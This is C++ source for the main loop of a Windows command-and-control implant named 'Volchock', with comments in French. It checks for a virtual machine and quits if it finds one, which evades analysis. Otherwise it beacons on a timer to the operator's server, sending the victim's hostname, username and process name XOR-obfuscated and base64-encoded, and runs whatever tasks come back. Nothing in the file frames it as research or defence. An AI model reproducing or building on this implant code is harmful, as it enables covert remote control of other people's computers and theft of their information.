#include <windows.h>
#include <iostream>
#include <thread>
#include <chrono>
#include <sstream>  
#include "config.h"
#include "system_utils.h"
#include "base64.h"
#include "crypt.h"
#include "http_client.h"
#include "task.h"
#include <random>
#include <ctime>
#include <intrin.h>
#include <array>
using namespace std;

// Déclaration de la fonction de détection
extern "C" bool is_virtual_machine();

string beakon(const string& data_res) {
    string agent_id = generate_agent_id();
    string hostname = get_hostname();
    string username = get_username();
    string process_name = get_process_name();
    ostringstream ss;
    ss << "{";
    ss << "\"agent_id\":\"" << agent_id << "\",";
    ss << "\"hostname\":\"" << hostname << "\",";
    ss << "\"username\":\"" << username << "\",";
    ss << "\"process_name\":\"" << process_name << "\",";
    ss << "\"results\":\"" << data_res << "\"";
    ss << "}";
    string result_json = ss.str();
    string encoded = xor_data(result_json, XOR_KEY);
    string b64_encoded = base64_encode(encoded);
    
    string res = http_post(VOLCHOCK_SERVERS, VOLCHOCK_PORT, RESULTS_PATH, USER_AGENT, HEADER, b64_encoded);
    return res;
}

void agent_run() {
    setvbuf(stdout, NULL, _IONBF, 0);

    // Utiliser la nouvelle fonction de détection
    if (is_virtual_machine()) {
        // Optionnel: message de debug
        // MessageBoxA(0, "VM detected - exiting", "Volchock", 0);
        return;
    }

    string register_call = beakon("");
    string result;
    while (true) {
        this_thread::sleep_for(chrono::seconds(BEACON_INTERVAL));
        string beakon_call = beakon(result);
        result = parse_task(beakon_call);
    }
}

int main() {
    agent_run();
    return 0;
}